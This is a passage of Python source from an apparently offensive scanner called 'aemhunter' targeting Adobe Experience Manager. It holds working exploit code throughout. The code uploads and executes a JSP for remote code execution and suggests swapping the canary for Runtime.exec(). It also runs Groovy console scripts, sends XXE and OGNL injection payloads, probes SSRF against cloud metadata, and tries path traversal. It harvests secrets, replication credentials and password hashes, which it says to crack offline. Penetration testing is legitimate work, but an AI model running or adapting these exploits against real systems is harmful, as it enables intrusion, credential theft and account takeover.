            ("/conf/aemhunter-" + marker, SEV_HIGH, "editable-template / config tamper"),
            ("/var/aemhunter-" + marker, SEV_MEDIUM, ""),
            ("/content/aemhunter-" + marker, SEV_INFO, "expected for an author; stored-XSS vector"),
            ("/tmp/aemhunter-" + marker, SEV_INFO, "scratch space, usually world-writable"),
        ]

        writable_code_path = None
        for base in code_candidates:
            if self._sling_can_write(base, marker):
                writable_code_path = base
                root = base.rsplit("/", 1)[0] or "/"
                self.reporter.add(Finding(
                    title=f"Sling WRITE to CODE space {root} {self._role_tag()} — JSP => RCE",
                    severity=SEV_CRITICAL, category=CAT_RCE, target=self.target + base,
                    evidence=f"Created+confirmed+deleted a node under {root} {self._who()}.",
                    description=(f"This session can write to {root} (script/code space). Drop a "
                                 "JSP or a sling:resourceType script here and request it for RCE. "
                                 "Not intended for a content-editor role."),
                    references=["https://github.com/0ang3el/aem-hacker"],
                    request=f"POST {base}  (jcr:primaryType=nt:unstructured&aemhunter={marker})",
                ))
                break

        any_write = writable_code_path is not None
        for base, sev, note in other:
            if self._sling_can_write(base, marker):
                any_write = True
                root = base.rsplit("/", 1)[0] or "/"
                suffix = f" — {note}" if note else ""
                self.reporter.add(Finding(
                    title=f"Sling POST write to {root} {self._role_tag()}{suffix}",
                    severity=sev, category=CAT_JCR, target=self.target + base,
                    evidence=f"Created+confirmed+deleted a node under {root} {self._who()}.",
                    description=("CONFIRMED JCR write via the Sling POST servlet. Writable config "
                                 "trees (/etc, /conf) enable tampering; /content write is expected "
                                 "for authors but enables stored XSS. None of these is direct RCE — "
                                 "see the CODE-space and Package Manager findings for that."),
                    request=f"POST {base}  (jcr:primaryType=nt:unstructured&aemhunter={marker})",
                ))

        if self.exploit and writable_code_path:
            self._sling_jsp_rce(writable_code_path.rsplit("/", 1)[0])
        return any_write

    def _sling_jsp_rce(self, code_root: str) -> None:
        """Drop a JSP into a known-writable code root and execute it."""
        marker = "".join(random.choices(string.ascii_uppercase, k=6))
        exec_token = "AEMHUNTERRCE" + marker  # only present if the JSP actually runs
        jsp = '<%= "AEMHUN" + "TERRCE" + "' + marker + '" + "-" + System.getProperty("user.name") %>'
        folder = f"{code_root.rstrip('/')}/aemhunter-{''.join(random.choices(string.ascii_lowercase, k=6))}"
        # Sling file upload creates an nt:file node from a multipart field.
        self._auth_post(folder + "/", files={"poc.jsp": ("poc.jsp", jsp, "application/octet-stream")})
        ex = self.client.get(folder + "/poc.jsp")
        if ex is not None and exec_token in (ex.text or ""):
            self.reporter.add(Finding(
                title=f"REMOTE CODE EXECUTION confirmed via Sling JSP under {code_root} {self._role_tag()}",
                severity=SEV_CRITICAL, category=CAT_RCE,
                target=self.target + folder + "/poc.jsp",
                evidence=f"Wrote a JSP under {code_root} via Sling POST and executed it: {snippet(ex.text, 140)}",
                description=("END-TO-END RCE: uploaded a JSP into a code space via the Sling POST "
                             "servlet and the server executed attacker Java code. Swap the canary "
                             "for Runtime.exec() for OS command execution."),
                references=["https://github.com/0ang3el/aem-hacker"],
                request=f"POST {folder}/ (multipart poc.jsp) then GET {folder}/poc.jsp",
                response_snippet=snippet(ex.text, 300),
            ))
        self._auth_post(folder, data={":operation": "delete"})

    # ---- Secret harvesting from readable trees ----
    def _harvest_secrets(self) -> None:
        trees = ["/etc.6.json", "/etc/cloudservices.infinity.json", "/etc/key.infinity.json",
                 "/home/users.6.json", "/conf.6.json", "/etc/replication.infinity.json"]
        key_re = re.compile(
            r'"([^"]*(?:[Pp]assword|[Ss]ecret|[Aa]ccess[_-]?[Kk]ey|[Tt]oken|[Pp]rivate[_-]?[Kk]ey|'
            r'apiKey|api_key|clientSecret|client_secret|credential)[^"]*)"\s*:\s*"([^"]+)"')
        seen: Set[Tuple[str, str]] = set()
        count = 0
        for t in trees:
            if count >= 30:
                break
            r = self.client.get(t)
            if not (r and r.status_code == 200 and not self._is_authwall(r)):
                continue
            body = r.text or ""
            if not body.lstrip().startswith("{"):
                continue
            for mm in key_re.finditer(body):
                if count >= 30:
                    break
                k, v = mm.group(1), mm.group(2)
                if not v or k in ("jcr:primaryType",) or v in ("", "true", "false"):
                    continue
                dedup = (k, v[:24])
                if dedup in seen:
                    continue
                seen.add(dedup)
                count += 1
                encrypted = v.strip().startswith("{") and v.strip().endswith("}")
                self.reporter.add(Finding(
                    title=f"Secret value readable: {k}",
                    severity=SEV_HIGH if encrypted else SEV_CRITICAL,
                    category=CAT_DISCLOSURE, target=self.target + t,
                    evidence=f"{k} = {v[:80]}",
                    description=("A secret-like value is readable in the JCR by this session. "
                                 + ("This value is AEM-crypto-encrypted ({...}); if /etc/key "
                                    "(master key) is also readable or packageable, it can be "
                                    "decrypted offline. " if encrypted else
                                    "This appears to be a plaintext secret. ")
                                 + "Harvest all such values for the report."),
                    response_snippet=f"{k}: {v[:120]}",
                ))

    # ---- Turn READ access into provable impact: creds + user dump ----
    def _recover_credentials(self) -> None:
        self._recover_replication_creds()
        self._dump_users()

    def _recover_replication_creds(self) -> None:
        """Replication agents carry transport creds to the PUBLISH instance —
        usually a high-priv account. Recovering them = lateral movement + likely
        RCE on publish. This is concrete, provable impact from read access."""
        rep_paths = [
            "/etc/replication/agents.author.infinity.json",
            "/etc/replication/agents.publish.infinity.json",
            "/etc/replication.infinity.json",
            "/etc/replication/agents.author.-1.json",
        ]
        seen: Set[Tuple[str, str]] = set()  # dedupe the same agent across overlapping paths
        for p in rep_paths:
            if len(seen) >= 10:
                break
            r = self.client.get(p)
            if not (r and r.status_code == 200 and not self._is_authwall(r)
                    and (r.text or "").lstrip().startswith("{")):
                continue
            body = r.text or ""
            for m in re.finditer(r'"transportUri"\s*:\s*"([^"]+)"', body):
                if len(seen) >= 10:
                    break
                uri = m.group(1)
                window = body[max(0, m.start() - 600): m.end() + 600]
                user = re.search(r'"transportUser"\s*:\s*"([^"]*)"', window)
                pw = re.search(r'"transportPassword"\s*:\s*"([^"]*)"', window)
                uval = user.group(1) if user else "?"
                pval = pw.group(1) if pw else ""
                key = (uri, uval)
                if key in seen:
                    continue
                seen.add(key)
                self.reporter.add(Finding(
                    title=f"Replication transport credentials readable {self._role_tag()} — lateral move to publish",
                    severity=SEV_CRITICAL, category=CAT_DISCLOSURE, target=self.target + p,
                    evidence=f"transportUri={uri} | transportUser={uval} | "
                             f"transportPassword={(pval[:28] + '...') if pval else '(empty)'}",
                    description=("A replication agent's transport credentials are readable. These "
                                 "authenticate the author to the PUBLISH instance (and dispatcher "
                                 "flush), frequently as a high-privilege/admin account — so this is "
                                 "direct lateral movement and a likely path to RCE on publish. "
                                 "Encrypted {...} passwords can be replayed through the agent or "
                                 "decrypted with the /etc/key master key."),
                    response_snippet=snippet(window, 300),
                ))

    def _dump_users(self) -> None:
        """Enumerate users / grab any leaked password hashes from readable /home."""
        sources = [
            # Egorov's QueryBuilder selective-properties trick — can leak rep:password
            # where the default JSON renderer hides it (slideshare/hacking-aem-sites).
            ("/bin/querybuilder.json?type=rep:User&p.hits=selective"
             "&p.properties=rep:principalName%20rep:password&p.limit=100", "querybuilder-selective"),
            ("/bin/querybuilder.json?path=/home/users&type=rep:User&p.hits=full&p.limit=500"
             "&p.properties=rep:authorizableId%20rep:principalName%20rep:password%20profile/email", "querybuilder"),
            ("/home/users.infinity.json", "sling-json"),
        ]
        for url, how in sources:
            r = self.client.get(url)
            if not (r and r.status_code == 200 and not self._is_authwall(r)):
                continue
            body = r.text or ""
            hashes = re.findall(r'"rep:password"\s*:\s*"([^"]+)"', body)
            ids = sorted(set(re.findall(r'"rep:authorizableId"\s*:\s*"([^"]+)"', body)))
            emails = sorted(set(re.findall(r'"email"\s*:\s*"([^"@]+@[^"]+)"', body)))
            if hashes:
                self.reporter.add(Finding(
                    title=f"User password HASHES dumped {self._role_tag()} — {len(hashes)} hashes (offline-crackable)",
                    severity=SEV_CRITICAL, category=CAT_DISCLOSURE,
                    target=self.target + url.split("?")[0],
                    evidence=f"Recovered {len(hashes)} rep:password hashes via {how}. "
                             f"Sample: {hashes[0][:48]}...",
                    description=("rep:password hashes for AEM users are readable. Crack them "
                                 "offline (they are typically salted SHA-256) to take over "
                                 "accounts — including potentially admin. Definitive, provable "
                                 "impact."),
                    response_snippet="; ".join(h[:40] for h in hashes[:5]),
                ))
                return
            if ids or emails:
                n = max(len(ids), len(emails))
                self.reporter.add(Finding(
                    title=f"User enumeration {self._role_tag()} — {n} users readable (no hashes exposed)",
                    severity=SEV_HIGH, category=CAT_DISCLOSURE,
                    target=self.target + url.split("?")[0],
                    evidence=f"{len(ids)} authorizableIds, {len(emails)} emails via {how}. "
                             f"Sample: {', '.join((ids or emails)[:8])}",
                    description=("The entire user directory is readable (PII: usernames/emails). "
                                 "rep:password is protected from this view, but a FileVault export "
                                 "of /home/users via the CRX DavEx server (already confirmed "
                                 "readable) does include the hashes — pull it manually to escalate "
                                 "to a full hash dump."),
                    response_snippet="; ".join((ids or emails)[:20]),
                ))
                return

    # =======================================================================
    # 4. Dispatcher bypass fuzzing
    # =======================================================================
    def check_dispatcher_bypasses(self) -> None:
        if not self._enabled("dispatcher"):
            return
        self.logger.section("Dispatcher bypass fuzzing")

        if self.fuzz_aggression == "aggressive":
            suffixes = list(BYPASS_SUFFIXES_AGGRESSIVE)
        elif self.fuzz_aggression == "quick":
            suffixes = [".css", ".js", ".png", ".html", "/a.css", ";.css"]
        else:
            suffixes = list(BYPASS_SUFFIXES)

        def fuzz(target_entry):
            path, label, sev = target_entry
            # Baseline
            r0 = self.client.get(path)
            baseline = (r0.status_code if r0 else None)
            if baseline == 200:
                # already exposed — separate check covers it
                return
            for suffix in suffixes:
                # Insert suffix before any query string
                if "?" in path:
                    base, qs = path.split("?", 1)
                    fuzzed = f"{base}{suffix}?{qs}"
                else:
                    fuzzed = f"{path}{suffix}"
                r = self.client.get(fuzzed)
                if r is None or r.status_code != 200 or len(r.content) <= 50:
                    continue
                # A login page also returns 200 and contains "granite" — skip it.
                if self._is_authwall(r):
                    continue
                body = safe_response_text(r, 2000)
                # Require a STRONG backend-data signature, not just a generic word.
                if not self._looks_like_backend_data(body):
                    continue
                self.reporter.add(Finding(
                    title=f"Dispatcher bypass: {label} via suffix '{suffix}'",
                    severity=sev, category=CAT_DISPATCHER,
                    target=self.target + fuzzed,
                    evidence=f"Baseline {baseline} -> bypass 200 ({len(r.content)} bytes) with backend data",
                    description=("The dispatcher allowed an unauthenticated request to "
                                 f"{path} when the suffix '{suffix}' was appended. The "
                                 "backend Sling resource resolver ignored the suffix and "
                                 "served the original servlet response (confirmed by "
                                 "real backend data, not a login page)."),
                    references=[
                        "https://labs.withsecure.com/advisories/adobe-experience-manager-dispatcher-bypass",
                        "https://blog.assetnote.io/",
                        "https://book.hacktricks.xyz/pentesting/pentesting-web/adobe-experience-manager-aem",
                    ],
                    request=self.client.request_signature("GET", fuzzed),
                    response_snippet=snippet(body, 600),
                ))
                # one hit per endpoint is enough — move on
                return

        with cf.ThreadPoolExecutor(max_workers=self.threads) as ex:
            list(ex.map(fuzz, DISPATCHER_TARGETS))

    # =======================================================================
    # 5. Sling info disclosure (.json / .infinity.json dumps)
    # =======================================================================
    def check_sling_info_disclosure(self) -> None:
        if not self._enabled("sling"):
            return
        self.logger.section("Sling info disclosure (.json / .infinity.json)")

        roots = list(SLING_INFO_ROOTS)
        sels = list(SLING_INFO_SELECTORS)
        if self.fuzz_aggression == "quick":
            sels = [".json", ".1.json", ".infinity.json"]

        def probe_root(root):
            # Try selectors in order; report ONE finding per readable root (the
            # first selector that works) instead of one per selector — otherwise
            # a readable /etc spams ~12 near-identical findings.
            for sel in sels:
                path = root + sel
                r = self.client.get(path)
                if r is None or r.status_code != 200 or self._is_authwall(r):
                    continue
                body = safe_response_text(r, 4000)
                if not body or len(body) < 30:
                    continue
                try:
                    if sel.endswith(".xml"):
                        if "<?xml" not in body[:200]:
                            continue
                    else:
                        stripped = body.lstrip()
                        if not (stripped.startswith("{") or stripped.startswith("[")):
                            continue
                        if stripped in ("{}", "[]"):
                            continue
                        if "jcr:" not in body and "sling:" not in body and "rep:" not in body:
                            continue
                except Exception:
                    continue

                sev = SEV_HIGH if sel in (".infinity.json", ".tidy.infinity.json", ".harray.4.json") else SEV_MEDIUM
                if root in ("/etc/cloudservices", "/etc/replication", "/etc/key",
                            "/home/users", "/home/groups"):
                    sev = SEV_HIGH
                # /libs and /apps are world-readable by default: framework code,
                # low value -> INFO to cut noise.
                if root in ("/libs", "/apps") or root.startswith(("/libs/", "/apps/")):
                    sev = SEV_INFO
                if RE_SECRET.search(body) or re.search(r"(?i)(\"password\"|access[_-]?key|aws_secret|salesforce.*secret)", body):
                    sev = SEV_CRITICAL

                self.reporter.add(Finding(
                    title=f"Sling info disclosure: {root} readable (via {sel})",
                    severity=sev, category=CAT_JCR, target=self.target + path,
                    evidence=f"HTTP 200, content-length {len(r.content)}, readable {self._who()}",
                    description=(f"The JCR tree under {root} is served as JSON {self._who()} "
                                 f"(via the '{sel}' selector; other selectors likely work too — "
                                 "this is reported once per root). Use it to enumerate users, "
                                 "groups, replication agents and cloud-service configs. "
                                 "(See the secret-harvest findings for concrete values.)"),
                    references=[
                        "https://experienceleague.adobe.com/docs/experience-manager-65/developing/introduction/sling-cheatsheet.html",
                        "https://github.com/0ang3el/aem-hacker",
                    ],
                    request=self.client.request_signature("GET", path),
                    response_snippet=snippet(body, 800),
                ))
                return  # one finding per root

        with cf.ThreadPoolExecutor(max_workers=self.threads) as ex:
            list(ex.map(probe_root, roots))

    # =======================================================================
    # 6. QueryBuilder API enumeration
    # =======================================================================
    def check_querybuilder(self) -> None:
        if not self._enabled("querybuilder"):
            return
        self.logger.section("QueryBuilder API probe")

        # Direct hit
        qb_paths = [
            "/bin/querybuilder.json?path=/&p.hits=full&p.limit=1",
            "/bin/querybuilder.json?path=/home/users&p.hits=full&p.limit=1",
            "/bin/querybuilder.json?path=/etc/cloudservices&p.hits=full&p.limit=1",
            "/bin/querybuilder.json?path=/etc/replication&p.hits=full&p.limit=1",
            "/bin/querybuilder.json?path=/var/audit&p.hits=full&p.limit=1",
            "/bin/querybuilder.feed.xml?path=/&p.hits=full&p.limit=1",
            "/bin/querybuilder.json?type=rep:User&p.hits=full&p.limit=1",
            "/bin/querybuilder.json?type=cq:Page&p.hits=full&p.limit=1",
        ]
        for p in qb_paths:
            r = self.client.get(p)
            if r is None or r.status_code != 200:
                continue
            if self._is_authwall(r):
                continue
            body = safe_response_text(r, 4000)
            stripped = body.lstrip()
            if p.endswith(".xml"):
                # QueryBuilder feed
                if "<?xml" not in stripped[:64] or not re.search(r"(?i)(querybuilder|<feed|<result)", body):
                    continue
            else:
                # Must be a real QueryBuilder JSON result, not an HTML page.
                if not stripped.startswith("{"):
                    continue
                if '"success"' not in body and '"hits"' not in body and '"results"' not in body:
                    continue
            sev = SEV_HIGH
            if "/home/users" in p or "type=rep:User" in p:
                sev = SEV_CRITICAL
            if "/etc/cloudservices" in p:
                sev = SEV_CRITICAL
            if True:
                self.reporter.add(Finding(
                    title=f"QueryBuilder API exposed: {p}",
                    severity=sev, category=CAT_DISCLOSURE, target=self.target + p,
                    evidence=f"HTTP 200 | {len(r.content)} bytes | valid QueryBuilder result {self._who()}",
                    description=("/bin/querybuilder.json is reachable unauthenticated. "
                                 "Iterate p.offset + p.limit to enumerate the entire JCR "
                                 "or filter by type (rep:User, cq:Page, dam:Asset)."),
                    references=[
                        "https://hackerone.com/reports/1247163",
                        "https://github.com/0ang3el/aem-hacker",
                    ],
                    request=self.client.request_signature("GET", p),
                    response_snippet=snippet(body, 700),
                ))

    # =======================================================================
    # 7. Groovy Console RCE attempt
    # =======================================================================
    def check_groovy_console(self) -> None:
        if not self._enabled("groovy"):
            return
        self.logger.section("Groovy Console probe")

        for p in ("/bin/groovyconsole", "/bin/groovyconsole.html",
                  "/etc/groovyconsole.html"):
            r = self.client.get(p)
            if r is None or r.status_code != 200:
                continue
            if self._is_authwall(r):
                continue
            if "Groovy" not in (r.text or ""):
                continue
            # Functional proof only: actually execute a benign canary script.
            payload = "out.println('AEM-HUNTER-CANARY-' + System.getProperty('user.name'))"
            rce = self.client.post("/bin/groovyconsole/post.json",
                                   data={"script": payload})
            if rce is not None and rce.status_code == 200 and "AEM-HUNTER-CANARY" in (rce.text or ""):
                self.reporter.add(Finding(
                    title=f"Groovy Console RCE confirmed {self._role_tag()}",
                    severity=SEV_CRITICAL, category=CAT_RCE,
                    target=self.target + "/bin/groovyconsole/post.json",
                    evidence=f"Canary echo via Groovy executed {self._who()}.",
                    description=("ACS Commons Groovy Console is enabled and executes scripts. "
                                 "Posting a script to /bin/groovyconsole/post.json gives "
                                 "instant OS-level RCE as the AEM service user."),
                    references=[
                        "https://adobe-consulting-services.github.io/acs-aem-commons/features/groovy-console/index.html",
                    ],
                    request=f"POST /bin/groovyconsole/post.json HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n\nscript={up.quote(payload)}",
                    response_snippet=snippet(rce.text, 500),
                ))
            else:
                # Shell renders but execution did not succeed -> INFO, not HIGH.
                self.reporter.add(Finding(
                    title=f"Groovy Console UI reachable (execution not confirmed) {self._role_tag()}",
                    severity=SEV_INFO, category=CAT_EXPOSURE,
                    target=self.target + p,
                    evidence="200 with 'Groovy' in body, but post.json did NOT execute the canary.",
                    description=("Groovy Console interface renders but script execution was "
                                 "blocked for this session. Re-test with higher-priv role "
                                 "cookies — if a role can execute here, that's critical RCE."),
                    request=self.client.request_signature("GET", p),
                    response_snippet=safe_response_text(r, 400),
                ))
            return

    # =======================================================================
    # 8. SSRF endpoints
    # =======================================================================
    def check_ssrf_endpoints(self) -> None:
        if not self._enabled("ssrf"):
            return
        self.logger.section("SSRF endpoint probe")

        canary_targets = [
            ("http://169.254.169.254/latest/meta-data/", "AWS IMDS"),
            ("http://169.254.169.254/computeMetadata/v1/", "GCP metadata"),
            ("http://127.0.0.1:4502/system/console", "loopback Felix console"),
            ("http://127.0.0.1:8080/", "loopback 8080"),
        ]

        for tmpl, param, label, cve in SSRF_TARGETS:
            for canary, canary_label in canary_targets:
                encoded = up.quote(canary, safe="")
                path = tmpl.format(u=encoded)
                r = self.client.get(path)
                if r is None or self._is_authwall(r):
                    continue
                body = safe_response_text(r, 2000)
                # Only flag when the response actually contains the probed
                # internal service's fingerprint — no weak/speculative signals,
                # those just create noise. Use an out-of-band canary for the rest.
                hit_signature = (
                    ("ami-id" in body or "instance-id" in body or "iam/" in body) or
                    ("Metadata-Flavor" in body or "computeMetadata" in body) or
                    (("Apache Felix Web Console" in body or "OSGi Management Console" in body)) or
                    ("<title>Apache Felix" in body and r.status_code == 200)
                )
                if hit_signature:
                    self.reporter.add(Finding(
                        title=f"SSRF via {label} -> {canary_label}",
                        severity=SEV_CRITICAL if "169.254" in canary else SEV_HIGH,
                        category=CAT_SSRF, target=self.target + path,
                        cve=cve,
                        evidence=f"Response contains the {canary_label} service signature.",
                        description=("The endpoint accepted an attacker-controlled URL "
                                     "and proxied the request server-side. This pivots "
                                     "into internal networks and cloud metadata services."),
                        references=[
                            "https://hackerone.com/reports/698991",
                            "https://nvd.nist.gov/vuln/detail/CVE-2018-5006",
                        ],
                        request=self.client.request_signature("GET", path),
                        response_snippet=snippet(body, 600),
                    ))
                    return  # one strong hit per SSRF target is enough

    # =======================================================================
    # 9. WebDAV / CRX Package Manager XXE probe
    # =======================================================================
    def check_webdav_xxe(self) -> None:
        if not self._enabled("xxe"):
            return
        self.logger.section("WebDAV / Package Manager XXE probe")

        xxe_payload = (
            "<?xml version=\"1.0\"?>"
            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>"
            "<D:propfind xmlns:D=\"DAV:\"><D:prop><D:displayname>&xxe;</D:displayname>"
            "</D:prop></D:propfind>"
        )
        for p in ("/crx/server/crx.default", "/crx/server/", "/crx/repository/crx.default"):
            r = self.client.request("PROPFIND", p, data=xxe_payload,
                                    headers={"Content-Type": "application/xml",
                                             "Depth": "0"})
            if r is None:
                continue
            body = safe_response_text(r, 2000)
            if "root:" in body or "/bin/bash" in body:
                self.reporter.add(Finding(
                    title="XXE in CRX WebDAV PROPFIND",
                    severity=SEV_CRITICAL, category=CAT_XXE,
                    target=self.target + p,
                    cve="CVE-2025-54254",
                    evidence="Response contained /etc/passwd contents.",
                    description=("PROPFIND on the CRX WebDAV endpoint parsed an external "
                                 "entity and reflected the contents of /etc/passwd. "
                                 "Pivot to AWS metadata or arbitrary file read."),
                    references=[
                        "https://hackerone.com/reports/436555",
                        "https://www.tenable.com/blog/cve-2025-54253-critical-rce-vulnerability-in-adobe-experience-manager-forms-on-jee",
                    ],
                    request=f"PROPFIND {p} HTTP/1.1\nContent-Type: application/xml\nDepth: 0\n\n{xxe_payload}",
                    response_snippet=snippet(body, 600),
                ))
                return
            elif r.status_code in (200, 207):
                self.reporter.add(Finding(
                    title="CRX WebDAV PROPFIND accepted XML input",
                    severity=SEV_MEDIUM, category=CAT_XXE,
                    target=self.target + p,
                    evidence=f"HTTP {r.status_code} on PROPFIND",
                    description=("WebDAV endpoint accepted custom PROPFIND XML. Confirm "
                                 "out-of-band XXE with a Collaborator / interactsh URL."),
                    request=f"PROPFIND {p}",
                    response_snippet=snippet(body, 400),
                ))

    # =======================================================================
    # 10. CVE-2025-54253 — AEM Forms JEE OGNL injection / RCE
    # =======================================================================
    def check_cve_2025_54253(self) -> None:
        if not self._enabled("cve"):
            return
        self.logger.section("CVE-2025-54253 (AEM Forms JEE /adminui/debug OGNL)")

        # Step 1: presence (must not be a login page)
        r = self.client.get("/adminui/debug")
        if r is None or r.status_code == 404:
            self.logger.debug("/adminui/debug not present.")
            return
        present = (r.status_code == 200 and not self._is_authwall(r))

        # Step 2: benign OGNL evaluation -> deterministic marker. No system commands.
        marker = "AEMHUNTER" + "".join(random.choices(string.ascii_uppercase, k=6))
        payload = f"pluginAction=%23a%3d%22{marker}%22"
        url = "/adminui/debug?debug=true&" + payload
        r2 = self.client.get(url)
        confirmed = (r2 is not None and r2.status_code == 200
                     and not self._is_authwall(r2) and marker in (r2.text or ""))

        if confirmed:
            self.reporter.add(Finding(
                title="CVE-2025-54253 OGNL evaluation confirmed (pre-auth RCE)",
                severity=SEV_CRITICAL, category=CAT_CVE,
                target=self.target + url,
                cve="CVE-2025-54253",
                evidence=f"Marker '{marker}' reflected in response after OGNL evaluation.",
                description=("/adminui/debug evaluated an attacker-supplied OGNL expression "
                             "and reflected the result. This is unauthenticated RCE (CISA KEV)."),
                references=[
                    "https://www.tenable.com/blog/cve-2025-54253-critical-rce-vulnerability-in-adobe-experience-manager-forms-on-jee",
                    "https://www.cisa.gov/known-exploited-vulnerabilities-catalog",
                ],
                request=self.client.request_signature("GET", url),
                response_snippet=snippet(r2.text, 500),
            ))
        elif present:
            # Reachable but OGNL not confirmed -> HIGH (worth manual follow-up), not CRITICAL.
            self.reporter.add(Finding(
                title="AEM Forms JEE debug console reachable (CVE-2025-54253 — unconfirmed)",
                severity=SEV_HIGH, category=CAT_CVE,
                target=self.target + "/adminui/debug",
                cve="CVE-2025-54253",
                evidence="HTTP 200 on /adminui/debug (not a login page); OGNL marker NOT reflected.",
                description=("The AEM Forms on JEE debug console is reachable without auth but "
                             "the OGNL probe did not reflect. Confirm manually — patched builds "
                             "still serve the page but reject the injection."),
                references=[
                    "https://www.tenable.com/blog/cve-2025-54253-critical-rce-vulnerability-in-adobe-experience-manager-forms-on-jee",
                    "https://helpx.adobe.com/security/products/aem/apsb25-50.html",
                ],
                request=self.client.request_signature("GET", "/adminui/debug"),
                response_snippet=safe_response_text(r, 500),
            ))
        else:
            self.logger.debug("/adminui/debug present but gated/patched; nothing confirmed.")

    # =======================================================================
    # 11. CVE-2018-5006 / CVE-2018-12809 quick checks
    # =======================================================================
    def check_legacy_cves(self) -> None:
        if not self._enabled("cve"):
            return
        self.logger.section("Legacy AEM CVE probes")

        # CVE-2018-5006 — SalesforceSecretServlet. Only flag if the loopback
        # Felix console was actually fetched (real SSRF), not on a generic 200.
        r = self.client.get("/libs/mcm/salesforce/customer.json?checkType=authentication&instance_url=http://127.0.0.1:4502/system/console")
        if (r is not None and r.status_code == 200 and not self._is_authwall(r)
                and ("Apache Felix" in (r.text or "") or "OSGi Management Console" in (r.text or ""))):
            self.reporter.add(Finding(
                title="SalesforceSecretServlet SSRF (CVE-2018-5006)",
                severity=SEV_HIGH, category=CAT_CVE,
                target=self.target + "/libs/mcm/salesforce/customer.json",
                cve="CVE-2018-5006",
                evidence="instance_url fetched the loopback Felix console (SSRF confirmed).",
                description=("Legacy MCM Salesforce connector proxied instance_url to an "
                             "internal service. SSRF pivot into internal hosts / cloud metadata."),
                references=["https://nvd.nist.gov/vuln/detail/CVE-2018-5006"],
                request=self.client.request_signature(
                    "GET", "/libs/mcm/salesforce/customer.json?...&instance_url=http://127.0.0.1:4502/system/console"),
                response_snippet=safe_response_text(r, 400),
            ))

        # CVE-2018-12809 — ReportingServicesServlet. Require the loopback console
        # fingerprint to appear, not just "Apache" (which is everywhere).
        r = self.client.get("/etc/reports/userreport.html?path=http://127.0.0.1:4502/system/console")
        if (r is not None and r.status_code == 200 and not self._is_authwall(r)
                and ("Apache Felix" in (r.text or "") or "OSGi Management Console" in (r.text or ""))):
            self.reporter.add(Finding(
                title="ReportingServicesServlet SSRF (CVE-2018-12809)",
                severity=SEV_HIGH, category=CAT_CVE,
                target=self.target + "/etc/reports/userreport.html",
                cve="CVE-2018-12809",
                evidence="Reporting servlet fetched the loopback Felix console (SSRF confirmed).",
                description="AEM Reporting servlet allowed an attacker-controlled path -> SSRF.",
                references=["https://nvd.nist.gov/vuln/detail/CVE-2018-12809"],
                request=self.client.request_signature("GET", "/etc/reports/userreport.html?path=http://127.0.0.1:4502/system/console"),
                response_snippet=safe_response_text(r, 400),
            ))

        # CVE-2021-43762 — path traversal / feature bypass to admin areas
        for path in ("/libs/granite/core/content/login.html/../../../../etc/passwd",
                     "/etc/..%2f..%2fetc%2fpasswd",
                     "/content/../../../../../../etc/passwd"):
            r = self.client.get(path)
            if r is not None and r.status_code == 200 and "root:" in (r.text or ""):
                self.reporter.add(Finding(
                    title="Path traversal (CVE-2021-43762 family)",
                    severity=SEV_CRITICAL, category=CAT_CVE,
                    target=self.target + path,
                    cve="CVE-2021-43762",
                    evidence="/etc/passwd content reflected.",
                    description="AEM mishandled normalization and served /etc/passwd.",
                    references=["https://nvd.nist.gov/vuln/detail/CVE-2021-43762"],
                    request=self.client.request_signature("GET", path),
                    response_snippet=safe_response_text(r, 400),
                ))
                break

    # =======================================================================
    # 12. Sling POST servlet abuse
    # =======================================================================
    def check_sling_post_servlet(self) -> None:
        if not self._enabled("slingpost"):
            return
        self.logger.section("Sling POST servlet probe")

        # Test if anon can write under /content/usergenerated or /content/aem-hunter
        marker = "aem-hunter-" + "".join(random.choices(string.ascii_lowercase, k=6))
        for base in ("/content/usergenerated", "/content/aem-hunter-test",
                     "/var/dam/aem-hunter", "/etc/aem-hunter-test"):
            path = f"{base}/{marker}"
            r = self.client.post(path, data={"jcr:primaryType": "nt:unstructured",
                                             "marker": marker})
            if r is None:
                continue
            if r.status_code in (200, 201):
                # confirm by re-GETting
                v = self.client.get(path + ".json")
                if v is not None and v.status_code == 200 and marker in (v.text or ""):
                    self.reporter.add(Finding(
                        title=f"Sling POST servlet allows arbitrary node creation at {base}",
                        severity=SEV_CRITICAL, category=CAT_JCR,
                        target=self.target + path,
                        evidence=f"Created node {path} and confirmed via GET .json",
                        description=("The Sling POST servlet accepted an unauthenticated "
                                     "POST that created a JCR node. With JCR write access "
                                     "an attacker can add themselves to administrators via "
                                     ":member=, alter content, or upload arbitrary files."),
                        references=[
                            "https://sling.apache.org/documentation/bundles/manipulating-content-the-slingpostservlet-servlets-post.html",
                            "https://github.com/0ang3el/aem-hacker",
                        ],
                        request=f"POST {path} HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n\njcr:primaryType=nt:unstructured&marker={marker}",
                        response_snippet=safe_response_text(r, 400),
                    ))
                    # cleanup attempt
                    self.client.post(path, data={":operation": "delete"})
                    return
            elif r.status_code == 500 and "javax.jcr" in (r.text or "").lower():
                # JCR error means we reached the post servlet but were denied —
                # still worth a low informational note
                self.reporter.add(Finding(
                    title=f"Sling POST servlet reachable at {base}",
                    severity=SEV_LOW, category=CAT_JCR,
                    target=self.target + path,
                    evidence=f"HTTP 500 with javax.jcr trace",
                    description="Anonymous POST reached the Sling POST servlet but was denied. "
                                "Worth retrying with low-priv role cookies.",
                ))

    # =======================================================================
    # 13. Source code disclosure tricks
    # =======================================================================
    def check_source_disclosure(self) -> None:
        if not self._enabled("source"):
            return
        self.logger.section("Source code / clientlib disclosure")

        # Append .source or .servlet to JSP-backed paths to read raw template
        candidates = [
            "/libs/granite/core/content/login.html.source",
            "/libs/granite/core/content/login.html.servlet",
            "/libs/wcm/core/content/sites/sites.html.source",
            "/etc/clientlibs/granite/utils.js.source",
            "/apps.source.json",
            "/content.source.json",
        ]
        for p in candidates:
            r = self.client.get(p)
            if r is None or r.status_code != 200:
                continue
            body = safe_response_text(r, 2000)
            if any(s in body for s in ("<%@", "<%=", "<%", "jsp:", "package ", "import com.adobe")):
                self.reporter.add(Finding(
                    title=f"Source code disclosure at {p}",
                    severity=SEV_MEDIUM, category=CAT_DISCLOSURE,
                    target=self.target + p,
                    evidence="Response contains JSP / Java source markers.",
                    description="Source-disclosure selectors leaked raw template / class source.",
                    request=self.client.request_signature("GET", p),
                    response_snippet=snippet(body, 600),
                ))

    # =======================================================================
    # 14. CSRF token grab (for authenticated POST modules)
    # =======================================================================
    def fetch_csrf_token(self) -> Optional[str]:
        r = self.client.get("/libs/granite/csrf/token.json")
